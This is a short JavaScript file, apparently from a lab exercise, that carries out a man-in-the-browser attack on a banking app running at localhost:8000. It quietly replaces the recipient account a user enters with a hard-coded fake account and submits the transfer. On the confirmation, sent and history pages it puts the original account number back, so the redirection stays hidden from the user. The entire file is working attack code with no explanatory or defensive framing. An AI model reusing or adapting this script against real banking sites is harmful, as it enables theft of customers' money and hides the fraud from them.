let account = '11111111111111111111111111'

localStorage.setItem('fake_account_number', account);

var re = /[0-9]{26}/

window.onload = function() {
    if(window.location.href == 'http://localhost:8000/transfer/') {
        document.getElementById('id_receiver_account').value = ""       
    
        function myFunction(){
            let data = document.getElementById('table').innerHTML;
            console.log(data)
            let replacedData = data.replace(re, localStorage.getItem('fake_account_number'));
            console.log(replacedData)
            localStorage.setItem('real_account_number', document.getElementById('id_receiver_account').value);
            if (document.getElementById('id_receiver_account').value)
            document.getElementById('id_receiver_account').value = localStorage.getItem('fake_account_number');
            console.log(replacedData)
            document.getElementById("transfer_sending_form").submit();
        }
        document.getElementById('submit_form').onclick = myFunction;
    }

    if(window.location.href == 'http://localhost:8000/transfer_confirm/') {
        console.log(document.getElementById('account').innerHTML)
        document.getElementById('account').innerHTML = this.localStorage.getItem('real_account_number');        
}
    if(window.location.href == 'http://localhost:8000/transfer_sent/') {
        console.log(document.getElementById('account').innerHTML)
        document.getElementById('account').innerHTML = this.localStorage.getItem('real_account_number');  
    }
    if(window.location.href == 'http://localhost:8000/transfers_history/') {
        var table = document.getElementById('table')
        var l = table.rows.length
        var i;
        var els = document.getElementsByTagName('td');
        var arr = [];
        for (var i = 0; i < els.length; i++) {
            if (els[i].getAttribute("name") == "account") {
                if(els[i].innerHTML == localStorage.getItem('fake_account_number')) {  
                    var td = document.getElementsByTagName('td')[i]
                    td.innerHTML = localStorage.getItem('real_account_number')
                    this.console.log(els[i].innerHTML)
                }
            }   
        }
    }
}